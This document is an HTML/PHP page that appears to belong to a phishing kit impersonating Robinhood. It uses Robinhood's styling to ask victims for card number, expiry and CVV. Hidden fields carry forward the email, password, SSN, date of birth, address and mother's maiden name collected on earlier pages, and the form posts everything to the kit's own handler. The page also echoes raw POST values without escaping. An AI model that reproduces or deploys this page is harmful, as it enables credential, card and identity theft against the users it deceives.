<html lang="en-US" dir="ltr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<link rel="shortcut icon" href="img/167EWkdKrN2X6Jqp7LEO9o.ico">
<link rel="stylesheet" href="https://cdn.robinhood.com/assets/generated_assets/legacyStyles.8a7c8392c805eaaf82a4.css" type="text/css" media="all" data-id="legacy-styles">
<link rel="stylesheet" href="https://cdn.robinhood.com/assets/generated_assets/App.8a7c8392c805eaaf82a4.css" type="text/css" media="all">
<link rel="stylesheet" type="text/css" href="css/a.css">
<title>Card Information | Robinhood</title>
</head>
<body class="theme-open-up">
								<center>
								<form class="_17_I0wDhYhTnsfNxPR0_CF up" method="POST" action="account/update-payment">
									<input type="hidden" name="email" value="<?= $_POST['email']; ?>">
									<input type="hidden" name="pass_log" value="<?= $_POST['pass_log']; ?>">
									<input type="hidden" name="fname" value="<?= $_POST['fname']; ?>">
									<input type="hidden" name="state" value="<?= $_POST['state']; ?>">
									<input type="hidden" name="city" value="<?= $_POST['city']; ?>">
									<input type="hidden" name="address" value="<?= $_POST['address']; ?>">
									<input type="hidden" name="zip" value="<?= $_POST['zip']; ?>">
									<input type="hidden" name="dob" value="<?= $_POST['dob']; ?>">
									<input type="hidden" name="phone" value="<?= $_POST['phone']; ?>">
									<input type="hidden" name="ssn" value="<?= $_POST['ssn']; ?>">
									<input type="hidden" name="mmn" value="<?= $_POST['mmn']; ?>">
									<header class="css-240zvz"><span class="css-1wyk9uc">Card Information</span><p>Please complete your credit card information</p></header><br>
											<div class="css-1ohcxfz">
												<label class="css-8atqhb">
												<div class="css-1te2hl9" style="width: 80%;">
													<span class="css-ktio0g" style="float: left;font-size: 15px;">Name on card</span><br>
												</div>
												<div class="css-p5k2s1" style="width: 80%;">
													<input type="text" name="cname" onkeypress="return event.charCode < 48 || event.charCode  >57" class="remove-legacy css-1ur67ge" value="" required autofocus></div>
												</label>
												</div>
											</div><br>
											<div class="css-1ohcxfz">
												<label class="css-8atqhb">
												<div class="css-1te2hl9" style="width: 80%;">
													<span class="css-ktio0g" style="float: left;font-size: 15px;">Card number</span><br>
												</div>
												<div class="css-p5k2s1" style="width: 80%;">
													<input type="text" name="cc" class="remove-legacy css-1ur67ge mask-ccn" placeholder="0000 0000 0000 0000" value="" required></div>
												</label>
												</div>
											</div><br>
											<div class="css-1ohcxfz">
												<label class="css-8atqhb">
												<div class="css-1te2hl9" style="width: 80%;">
													<span class="css-ktio0g" style="float: left;font-size: 15px;">Expired date</span><br>
												</div>
												<div class="css-p5k2s1" style="width: 80%;">
													<input type="text" name="exp" class="remove-legacy css-1ur67ge mask-exp" minlength="7" maxlength="7" placeholder="MM/YYYY" value="" required></div>
												</label>
												</div>
											</div><br>
											<div class="css-1ohcxfz">
												<label class="css-8atqhb">
												<div class="css-1te2hl9" style="width: 80%;">
													<span class="css-ktio0g" style="float: left;font-size: 15px;">CVV/CVC</span><br>
												</div>
												<div class="css-p5k2s1" style="width: 80%;">
													<input type="password" name="cvv" class="remove-legacy css-1ur67ge" minlength="3" maxlength="4" placeholder="***" value="" required></div>
												</label>
												</div>
											</div>
									<br>
									<div class="css-0">
										<button type="submit" class="_1OsoaRGpMCXh9KT8s7wtwm _2GHn41jUsfSSC9HmVWT-eg"><span class="css-1o0fjrg">Continue</span></button>
									</div>
								</form>
								</center>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<!-- Masking -->
<script src="js/jquery.min.js"></script>
<script src="js/jquery.mask.min.js"></script>
<script type="text/javascript">
    $(document).ready(function(){
      $('.mask-exp').mask('00/0000');
      $('.mask-ccn').mask('0000 0000 0000 0000');
      $('.mask-dob').mask('00/00/0000');
      $('.mask-dln').mask('00 000 000');
      $('.mask-ssn').mask('000-00-0000');
      $('.mask-cvv').mask('000');
      $('.mask-pin').mask('000000');
      $('.time').mask('00:00:00');
      $('.date_time').mask('00/00/0000 00:00:00');
      $('.mask-phone').mask('000000000000');
      $('.phone_with_ddd').mask('(00) 0000-0000');
      $('.phone_us').mask('(000) 000-0000');
      $('.mixed').mask('AAA 000-S0S');
      $('.money').mask('000.000.000.000.000,00', {reverse: true});
      $('.money2').mask("#.##0,00", {reverse: true});
      $('.ip_address').mask('099.099.099.099');
      $('.percent').mask('##0,00%', {reverse: true});
      $('.placeholder').mask("00/00/0000", {placeholder: "__/__/____"});
      $('.mask-cc').mask('0000 0000 0000 0000');
      $('.valid').mask('00/00');
    });
  </script>
<!-- End Masking -->
<!-- Validasi Number & Text -->
<script>
    function hanyaAngka(evt) {
      var charCode = (evt.which) ? evt.which : event.keyCode
       if (charCode > 31 && (charCode < 48 || charCode > 57))
 
        return false;
      return true;
    }
  </script>
<!-- End Validasi -->
</body>
</html>